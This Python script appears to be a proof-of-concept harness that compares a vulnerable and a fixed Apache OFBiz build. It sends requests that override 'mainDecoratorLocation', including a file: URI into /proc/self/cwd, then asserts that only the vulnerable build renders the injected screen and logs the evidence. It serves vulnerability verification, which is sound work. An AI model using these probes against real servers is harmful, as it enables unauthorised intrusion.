#!/usr/bin/env python3
"""Benign affected/fixed OFBiz decorator override controls."""

import hashlib
import json
import re
import sys
from datetime import datetime, timezone
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

root = Path(__file__).resolve().parents[1]
evidence = root / "evidence" / "local-2026-11-05"
evidence.mkdir(parents=True, exist_ok=True)
path = "/webtools/control/main"
value = "component://accounting/widget/CommonScreens.xml"
file_value = "file:/proc/self/cwd/framework/webtools/widget/CommonScreens.xml"
cases = {
    "baseline": ("GET", {}, None, None),
    "file_uri_override": ("POST", {"Content-Type": "application/json"}, json.dumps({"mainDecoratorLocation": file_value}), None),
    "component_override_control": ("POST", {"Content-Type": "application/json"}, json.dumps({"mainDecoratorLocation": value}), None),
    "json_unrelated": ("POST", {"Content-Type": "application/json"}, json.dumps({"unrelatedMarker": "benign"}), None),
    "form_override": ("POST", {"Content-Type": "application/x-www-form-urlencoded"}, "mainDecoratorLocation=component%3A%2F%2Faccounting%2Fwidget%2FCommonScreens.xml", None),
    "query_override": ("GET", {}, None, {"mainDecoratorLocation": value}),
}
targets = {"vulnerable_24_09_07": sys.argv[1], "fixed_24_09_08": sys.argv[2]}
results = []
for target, base in targets.items():
    for repeat in range(3):
        for name, (method, headers, body, params) in cases.items():
            session = requests.Session()
            session.trust_env = False
            response = session.request(method, base + path, headers=headers, data=body, params=params,
                                       timeout=30, verify=False, allow_redirects=False)
            content = response.text
            title = re.search(r"<title[^>]*>(.*?)</title>", content, re.I | re.S)
            result = {
                "target": target,
                "case": name,
                "repeat": repeat + 1,
                "method": method,
                "path": path,
                "status": response.status_code,
                "content_type": response.headers.get("Content-Type"),
                "body_sha256": hashlib.sha256(response.content).hexdigest(),
                "title": title.group(1).strip() if title else None,
                "webtools_section": "Begin section widgetcomponent://webtools/widget/CommonScreens.xml#main-decorator" in content,
                "accounting_section": "Begin section widgetcomponent://accounting/widget/CommonScreens.xml#main-decorator" in content,
                "file_screen_section": "Begin section widgetfile:/proc/self/cwd/framework/webtools/widget/CommonScreens.xml#main-decorator" in content,
            }
            results.append(result)
            print(json.dumps(result))
            session.close()

assert len(results) == 36
for result in results:
    assert result["status"] == 200, result
    vulnerable = result["target"] == "vulnerable_24_09_07"
    should_file = vulnerable and result["case"] == "file_uri_override"
    should_component = vulnerable and result["case"] == "component_override_control"
    assert result["file_screen_section"] == should_file, result
    assert result["accounting_section"] == should_component, result
    assert result["webtools_section"] == (not should_file and not should_component), result

report = {"at": datetime.now(timezone.utc).isoformat(), "component_case_value": value,
          "file_case_value": file_value, "targets": targets, "results": results,
          "conclusion": "3/3 affected file URI positives and 3/3 affected component controls; all fixed and other-method controls negative"}
(evidence / "probes.json").write_text(json.dumps(report, indent=2) + "\n")
